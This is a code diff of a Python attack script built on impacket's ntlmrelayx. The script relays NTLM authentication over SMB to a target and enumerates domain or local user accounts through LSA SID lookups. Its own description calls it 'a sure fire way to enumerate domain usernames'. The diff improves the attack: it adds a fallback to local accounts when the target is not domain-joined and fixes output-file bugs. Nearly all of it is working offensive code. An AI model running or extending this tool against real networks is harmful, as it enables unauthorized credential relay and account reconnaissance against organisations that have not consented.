@@ -9,7 +9,6 @@ from impacket.dcerpc.v5 import transport, lsat, lsad
 from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5.samr import SID_NAME_USE
-from impacket.examples.ntlmrelayx.servers.httprelayserver import HTTPRelayServer
 from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
 from impacket.examples import logger
 from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
@@ -29,10 +28,6 @@ class SMBAttack(Thread):
         else:
             self.__SMBConnection = SMBClient
         self.config = config
-        self.__answerTMP = ''
-
-    def __answer(self, data):
-        self.__answerTMP += data
 
     def run(self):
         global got_usernames
@@ -46,14 +41,23 @@ class SMBAttack(Thread):
         resp = lsat.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
         policyHandle = resp['PolicyHandle']
 
+        # Get Domain Sid if we are in a domain
+        logging.info('Dumping usernames')
         resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
                                                  lsad.POLICY_INFORMATION_CLASS.PolicyPrimaryDomainInformation)
-        domainSid = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
+        if resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid']:
+            domainSid = resp['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
+        else:
+            # If we get an exception, maybe we aren't in a domain. Get local Sid instead
+            logging.info('Target not joined to a domain. Getting local accounts instead')
+            resp = lsad.hLsarQueryInformationPolicy2(dce, policyHandle,
+                                                     lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
+            domainSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
 
         fh = None
         if self.config.outputFile:
             try:
-                fh = open(self.config.outputFile, 'rw')
+                fh = open(self.config.outputFile, 'w+')
             except Exception:
                 logging.exception('Could not open file for writing')
 
@@ -89,7 +93,7 @@ class SMBAttack(Thread):
                     SID_NAME_USE.enumItems(item['Use']).name)
                     print line
                     if fh:
-                        fh.write(line)
+                        fh.write(line + '\n')
 
             soFar += SIMULTANEOUS
 
@@ -100,7 +104,7 @@ class SMBAttack(Thread):
 
 
 if __name__ == '__main__':
-    RELAY_SERVERS = (SMBRelayServer, HTTPRelayServer)
+    RELAY_SERVERS = (SMBRelayServer,)  # TODO: Maybe fix HTTP redirects later
     ATTACKS = {'SMB': SMBAttack}
 
     parser = argparse.ArgumentParser(description='A sure fire way to enumerate domain usernames')
@@ -127,18 +131,9 @@ if __name__ == '__main__':
         c.setProtocolClients(PROTOCOL_CLIENTS)
         c.setRunSocks(False, None)
         c.setTargets(targetSystem)
-        c.setExeFile(None)
-        c.setCommand(None)
         c.setEncoding(codec)
         c.setAttacks(ATTACKS)
-        c.setLootdir('.')
         c.setOutputFile(args.out_file)
-        c.setLDAPOptions(None, None)
-        c.setMSSQLOptions(None)
-        c.setInteractive(None)
-        c.setIMAPOptions('password', 'INBOX', None, 0)
-        c.setIPv6(None)
-        c.setWpadOptions(None, None)
         c.setSMB2Support(True)
         c.setInterfaceIp('')
         c.setMode('REDIRECT')
